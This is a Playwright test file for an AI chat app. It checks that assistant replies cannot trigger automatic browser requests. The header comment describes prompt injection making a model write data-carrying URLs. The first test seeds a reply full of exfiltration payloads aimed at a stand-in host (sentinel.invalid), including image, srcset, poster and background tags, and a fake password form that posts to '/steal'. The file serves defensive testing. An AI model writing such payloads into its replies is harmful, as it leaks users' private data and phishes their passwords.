import { randomUUID } from "node:crypto";
import { expect, type Locator, type Page, test } from "@playwright/test";
import { db } from "../../src/lib/server/db";
import { messages } from "../../src/lib/server/db/schema";
import {
	BRAVE_THUMBNAIL_HOST,
	FAVICON_ROUTE,
	IMAGE_SEARCH_TOOL,
	IMAGE_THUMBNAIL_ROUTE,
} from "../../src/lib/shared/url-provenance";
import { createEmptyConversation, login } from "./helpers";

// The rule (docs/plans/exfil-channels): an address the browser requests without a click
// comes from the user's own words or from a tool's result, never from the model's. A
// reply can have come from a page the model read, and a prompt injection in it can make
// the model write an address with private data in its path, query or host; as a picture,
// a poster, a background or a favicon that address is requested the moment the reply
// renders, mid-stream, with no click. Every case counts what the browser asked a
// stand-in host for (`page.route`), the way mermaid-hardening.spec.ts does, and looks at
// what was drawn: a reply's markup must also stay in-flow content, with no form to ask
// for a password and nothing laid over the page.

const HOST = "sentinel.invalid";
const KNOWN_HOST = "known.invalid";
// The names the app itself uses for them, so the spec cannot drift from the code it checks.
const BRAVE_HOST = BRAVE_THUMBNAIL_HOST;
const PIXEL = Buffer.from(
	"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
	"base64",
);
const URL_ON = (host: string, path: string) => `https://${host}/${path}`;

/** A request to one of the app's own routes, with a query (the app asks for both with one). */
function routeWithQuery(route: string): RegExp {
	return new RegExp(`${route.replaceAll("/", "\\/")}\\?`);
}

type Calls = {
	/** Everything asked of the stand-in host, whatever the path. */
	standIn: string[];
	/** Everything asked of Brave's image proxy directly (the app's route is the only way to it). */
	brave: string[];
	/** The app's favicon proxy, with the host asked about. */
	favicon: string[];
	/** The app's thumbnail route, which these specs answer themselves (the server route is its own slice). */
	thumbnail: string[];
};

/** Answers every request that could leave the app for a picture, and counts it. */
async function watchRequests(
	page: Page,
	options: { thumbnailStatus?: number } = {},
): Promise<Calls> {
	const calls: Calls = { standIn: [], brave: [], favicon: [], thumbnail: [] };
	const picture = (route: { fulfill: (init: object) => Promise<void> }) =>
		route.fulfill({
			status: 200,
			contentType: "image/png",
			body: PIXEL,
			headers: { "access-control-allow-origin": "*" },
		});
	await page.route(
		new RegExp(`^https?://[^/]*${HOST.replaceAll(".", "\\.")}[/:]`),
		async (route) => {
			calls.standIn.push(route.request().url());
			await picture(route);
		},
	);
	await page.route(
		new RegExp(`^https?://[^/]*${BRAVE_HOST.replaceAll(".", "\\.")}/`),
		async (route) => {
			calls.brave.push(route.request().url());
			await picture(route);
		},
	);
	await page.route(routeWithQuery(FAVICON_ROUTE), async (route) => {
		calls.favicon.push(
			new URL(route.request().url()).searchParams.get("domain") ?? "",
		);
		await picture(route);
	});
	await page.route(routeWithQuery(IMAGE_THUMBNAIL_ROUTE), async (route) => {
		calls.thumbnail.push(route.request().url());
		if (options.thumbnailStatus && options.thumbnailStatus !== 200) {
			await route.fulfill({ status: options.thumbnailStatus, body: "" });
			return;
		}
		await picture(route);
	});
	return calls;
}

let sequence = 900;

/** A chat with one assistant reply, optionally with the tool calls it made, as the server stores them. */
async function seedReply(
	page: Page,
	content: string,
	toolCalls?: unknown[],
): Promise<string> {
	const conversationId = await createEmptyConversation(
		page,
		"Remote resources",
	);
	sequence += 1;
	await db.insert(messages).values({
		id: randomUUID(),
		conversationId,
		messageSequence: sequence,
		role: "assistant",
		content,
		toolCalls: toolCalls ? JSON.stringify(toolCalls) : null,
		createdAt: new Date(Date.now() + sequence),
	});
	return conversationId;
}

async function openChat(page: Page, conversationId: string) {
	await page.evaluate((id) => {
		window.sessionStorage.removeItem(`pending-chat-message:${id}`);
	}, conversationId);
	await page.goto(`/chat/${conversationId}`);
	await page.reload({ waitUntil: "networkidle" });
}

/** The tool call image_search leaves in a stored reply: the picture and Brave's resized copy of it. */
function imageSearchCall(picture: string, thumbnail: string) {
	return {
		type: "tool_call",
		callId: `call-${randomUUID()}`,
		name: IMAGE_SEARCH_TOOL,
		input: { query: "a cat on a sofa" },
		status: "done",
		candidates: [
			{
				id: "img-1",
				title: "A cat on a sofa",
				url: picture,
				sourceType: "web",
				metadata: { thumbnail },
			},
		],
	};
}

/** What a reader would see move a page: anything the reply made `position: fixed`. */
async function fixedElementsIn(scope: Locator): Promise<string[]> {
	return scope.evaluate((root) =>
		Array.from(root.querySelectorAll("*"))
			.filter((element) => getComputedStyle(element).position === "fixed")
			.map((element) => `${element.localName}.${element.className}`),
	);
}

/** Once the page is idle: a request for a picture or a favicon can arrive a moment after it is drawn. */
async function settle(page: Page) {
	await page.waitForLoadState("networkidle");
	await page.waitForTimeout(800);
}

test.describe("what a reply asks the browser to fetch on its own", () => {
	test.beforeEach(async ({ page }) => {
		await page.setViewportSize({ width: 1440, height: 900 });
		await login(page);
	});

	test("an injected picture, srcset, poster, background, form, overlay and chip to an unknown host make no request, and the picture is a link chip", async ({
		page,
	}) => {
		const calls = await watchRequests(page);
		const conversationId = await seedReply(
			page,
			[
				"Here is the plan you asked for.",
				"",
				`![injected markdown image](${URL_ON(HOST, "md.png?d=SECRET")})`,
				"",
				`<img src="${URL_ON(HOST, "raw.png?d=SECRET")}" alt="raw html image">`,
				"",
				`<img srcset="${URL_ON(HOST, "srcset-1x.png")} 1x, ${URL_ON(HOST, "srcset-2x.png")} 2x" alt="srcset image">`,
				"",
				`<picture><source srcset="${URL_ON(HOST, "picture.png")}"><img src="${URL_ON(HOST, "picture-fallback.png")}" alt="picture"></picture>`,
				"",
				`<video poster="${URL_ON(HOST, "poster.png?d=SECRET")}" controls></video>`,
				"",
				`<table background="${URL_ON(HOST, "table-bg.png")}"><tr><td background="${URL_ON(HOST, "cell-bg.png")}">a cell</td></tr></table>`,
				"",
				`<input type="image" src="${URL_ON(HOST, "input.png")}" alt="input image">`,
				"",
				`<form action="${URL_ON(HOST, "steal")}" method="post"><p>Please sign in again.</p><input type="password" name="pw"><button type="submit">Sign in</button></form>`,
				"",
				`<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:2147483647;background:red">overlay one</div>`,
				"",
				`<div class="fixed inset-0 z-50 bg-black">overlay two</div>`,
				"",
				`See [the docs](${URL_ON(HOST, "docs?d=SECRET")}) for more.`,
			].join("\n"),
		);
		await openChat(page, conversationId);

		const reply = page.getByTestId("assistant-message");
		const prose = reply.locator(".markdown-html");
		await expect(reply).toContainText("Here is the plan you asked for.");
		// What the browser asked for comes first, and soft: a request starts as the reply is
		// drawn and can arrive a moment after, and one run should name every way in that
		// still leaks, not stop at the first.
		await settle(page);
		expect
			.soft(calls.standIn, "what the browser asked the stand-in host for")
			.toEqual([]);
		expect
			.soft(
				calls.favicon.filter((domain) => domain.includes(HOST)),
				"the favicon proxy asked about the stand-in host",
			)
			.toEqual([]);
		expect.soft(calls.brave, "Brave's proxy, asked directly").toEqual([]);
		expect.soft(calls.thumbnail, "the thumbnail route").toEqual([]);

		// The picture the reply named is a chip: the words it gave, the host, and a way to
		// open it on purpose. It says it was not loaded.
		const chip = prose.locator("a.source-link-chip--image");
		await expect(chip).toHaveCount(1);
		await expect(chip).toBeVisible();
		await expect(chip).toContainText("injected markdown image");
		await expect(chip).toContainText(HOST);
		await expect(chip).toHaveAttribute("target", "_blank");
		await expect(chip).toHaveAttribute("rel", "noopener noreferrer external");
		await expect(chip).toHaveAttribute("title", /Image not loaded/);
		await expect(chip).toHaveAttribute("aria-label", /Image not loaded/);
		await expect(chip).toHaveAttribute("href", /sentinel\.invalid\/md\.png/);

		// Nothing in the reply is a picture, a poster or a background any more.
		await expect(
			prose.locator("img, source, video[poster], [background]"),
		).toHaveCount(0);

		// The link to the docs is a chip too, and a link is the reader's choice: it shows the
		// globe at once, with no favicon to ask the app's proxy for.
		const docs = prose.locator(
			"a.source-link-chip:not(.source-link-chip--image)",
		);
		await expect(docs).toHaveCount(1);
		await expect(docs).toContainText("the docs");
		await expect(docs.locator("img")).toHaveCount(0);
		await expect(
			docs.locator(".source-link-chip__favicon-fallback"),
		).toBeVisible();

		// No form, no control, nothing laid over the page; the words that were in them stay.
		await expect(
			prose.locator("form, input, button, select, textarea, dialog"),
		).toHaveCount(0);
		await expect(prose).toContainText("Please sign in again.");
		await expect(prose).toContainText("overlay one");
		await expect(prose).toContainText("overlay two");
		expect(await fixedElementsIn(prose)).toEqual([]);
		await expect(prose.locator(".fixed, .inset-0, .z-50")).toHaveCount(0);
	});

	test("a picture image_search returned is shown once, as Brave's thumbnail through the app's route, and nothing goes to the picture's own host", async ({
		page,
	}) => {
		const calls = await watchRequests(page);
		const picture = URL_ON(HOST, "cat.jpg");
		const thumbnail = URL_ON(
			BRAVE_HOST,
			"Zq3s9x/rs:fit:500:0:0:0/g:ce/aHR0cHM6Ly9zZW50aW5lbC5pbnZhbGlkL2NhdC5qcGc",
		);
		const conversationId = await seedReply(
			page,
			`Here is the cat.\n\n![A cat on a sofa](${picture})`,
			[imageSearchCall(picture, thumbnail)],
		);
		await openChat(page, conversationId);

		const reply = page.getByTestId("assistant-message");
		const prose = reply.locator(".markdown-html");
		await expect(reply).toContainText("Here is the cat.");
		await settle(page);
		expect.soft(calls.standIn, "the picture's own host").toEqual([]);
		expect.soft(calls.brave, "Brave's proxy, asked directly").toEqual([]);

		const images = prose.locator("img");
		await expect(images).toHaveCount(1);
		const source = await images.first().getAttribute("src");
		expect(source?.startsWith(`${IMAGE_THUMBNAIL_ROUTE}?url=`)).toBe(true);
		expect(
			new URL(source ?? "", "http://app.test").searchParams.get("url"),
		).toBe(thumbnail);
		await expect(images.first()).toHaveAttribute("alt", "A cat on a sofa");
		// It loads, and the skeleton frame hands over to the picture.
		await expect(prose.locator(".markdown-image-frame--loaded")).toHaveCount(1);
		await expect(prose.locator("a.source-link-chip--image")).toHaveCount(0);

		// A click on it opens the lightbox on the same copy.
		await images.first().click();
		const lightbox = page.getByTestId("image-lightbox");
		await expect(lightbox).toBeVisible();
		await expect(lightbox.locator("img")).toHaveAttribute(
			"src",
			new RegExp(`${IMAGE_THUMBNAIL_ROUTE.replaceAll("/", "\\/")}\\?url=`),
		);

		expect(calls.thumbnail.length).toBeGreaterThanOrEqual(1);
		expect(
			calls.thumbnail.every((url) =>
				url.includes(encodeURIComponent(thumbnail)),
			),
		).toBe(true);
		expect(calls.standIn, "the picture's own host").toEqual([]);
		expect(calls.brave, "Brave's proxy, asked directly").toEqual([]);
	});

	test("a picture the app cannot fetch is hidden like any broken picture, and the frame collapses", async ({
		page,
	}) => {
		const calls = await watchRequests(page, { thumbnailStatus: 404 });
		const picture = URL_ON(HOST, "gone.jpg");
		const thumbnail = URL_ON(BRAVE_HOST, "Zq3s9x/gone");
		const conversationId = await seedReply(
			page,
			`Here is the cat.\n\n![A cat](${picture})`,
			[imageSearchCall(picture, thumbnail)],
		);
		await openChat(page, conversationId);

		const prose = page
			.getByTestId("assistant-message")
			.locator(".markdown-html");
		await expect(prose.locator("img.markdown-image--broken")).toHaveCount(1);
		await expect(prose.locator(".markdown-image-frame--broken")).toHaveCount(1);
		await expect(prose.locator(".markdown-image-frame--loading")).toHaveCount(
			0,
		);
		await expect(prose.locator("img.markdown-image--broken")).toBeHidden();
		expect(calls.standIn).toEqual([]);
	});

	test("a source chip asks the favicon proxy only for a host a tool of the same message returned", async ({
		page,
	}) => {
		const calls = await watchRequests(page);
		const known = URL_ON(KNOWN_HOST, "docs");
		const conversationId = await seedReply(
			page,
			`See [the known docs](${known}) and [a stranger](${URL_ON(HOST, "docs?d=SECRET")}).`,
			[
				{
					type: "tool_call",
					callId: `call-${randomUUID()}`,
					name: "research_web",
					input: { query: "docs" },
					status: "done",
					candidates: [
						{
							id: "web-1",
							title: "Known docs",
							url: known,
							sourceType: "web",
						},
					],
				},
			],
		);
		await openChat(page, conversationId);

		const prose = page
			.getByTestId("assistant-message")
			.locator(".markdown-html");
		const chips = prose.locator("a.source-link-chip");
		await expect(chips).toHaveCount(2);
		await expect(
			chips.nth(0).locator("img.source-link-chip__favicon"),
		).toHaveAttribute("src", `${FAVICON_ROUTE}?domain=${KNOWN_HOST}`);
		await expect(chips.nth(1).locator("img")).toHaveCount(0);
		await expect(
			chips.nth(1).locator(".source-link-chip__favicon-fallback"),
		).toBeVisible();

		await settle(page);
		expect(calls.favicon).toContain(KNOWN_HOST);
		expect
			.soft(
				calls.favicon.filter((domain) => domain.includes(HOST)),
				"the favicon proxy asked about the stand-in host",
			)
			.toEqual([]);
		expect.soft(calls.standIn).toEqual([]);
	});
});
